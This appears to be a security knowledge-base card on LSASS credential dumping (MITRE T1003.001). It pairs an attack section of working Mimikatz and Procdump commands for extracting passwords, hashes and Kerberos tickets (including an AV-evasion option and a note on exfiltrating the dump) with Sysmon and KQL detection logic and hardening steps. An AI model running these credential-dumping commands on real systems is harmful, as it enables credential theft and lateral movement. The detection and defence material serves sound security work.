# [CA-DUMP-001]: Mimikatz LSASS Memory Extraction

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-001 |
| **MITRE ATT&CK v18.1** | [OS Credential Dumping: LSASS Memory (T1003.001)](https://attack.mitre.org/techniques/T1003/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Endpoint |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Exploiting the Windows Local Security Authority Subsystem Service (LSASS) to extract plaintext passwords, NTLM hashes, and Kerberos tickets stored in memory. The tool `Mimikatz` interacts with the `lsass.exe` process to read these secrets.
- **Attack Surface:** The `lsass.exe` process on any compromised Windows host (Workstation or Server).
- **Business Impact:** **Full Identity Compromise**. Attackers gain valid credentials to move laterally or elevate privileges.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Administrator or SYSTEM (Debug Privilege required).
- **Vulnerable Config:**
    - LSA Protection (RunAsPPL) disabled.
    - Credential Guard disabled (allows plaintext/NTLM retrieval).
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - [Procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) (for stealth)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Privilege Check**
Ensure you have `SeDebugPrivilege`.
```powershell
whoami /priv | findstr "SeDebug"
```

**Step 2: Exploitation (Direct Mimikatz)**
Run Mimikatz to dump logon passwords.
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Step 3: Stealth Option (Procdump)**
Dump the LSASS memory to a file first to avoid AV detection of the Mimikatz binary.
```cmd
procdump.exe -ma lsass.exe lsass.dmp
# Exfiltrate lsass.dmp and run Mimikatz offline:
# .\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Sysmon & Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Sysmon** | 10 | TargetImage ends with `lsass.exe`, GrantedAccess includes `0x1010` or `0x1410` (Read/Write Memory) |
| **Security** | 4663 | Object Name = `\Device\HarddiskVolume...\Windows\System32\lsass.exe`, Access Mask = `0x10` |

#### 5.2 Microsoft Sentinel (KQL)
```kusto
SysmonEvent
| where EventID == 10
| where TargetImage has "lsass.exe"
| where SourceImage !in ("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\MsMpEng.exe")
| project TimeGenerated, SourceImage, TargetImage, GrantedAccess
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **LSA Protection:** Enable "RunAsPPL" via Registry to prevent non-protected processes from reading LSASS memory.
    `reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f`
*   **Credential Guard:** Enable Windows Defender Credential Guard (Virtualization-based Security) to isolate secrets.
*   **Attack Surface Reduction (ASR):** Enable rule "Block credential stealing from the Windows local security authority subsystem".

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-VALID-001] (Initial Access)
> **Next Logical Step:** [LAT-AD-001] (Pass-the-Hash / Lateral Movement)
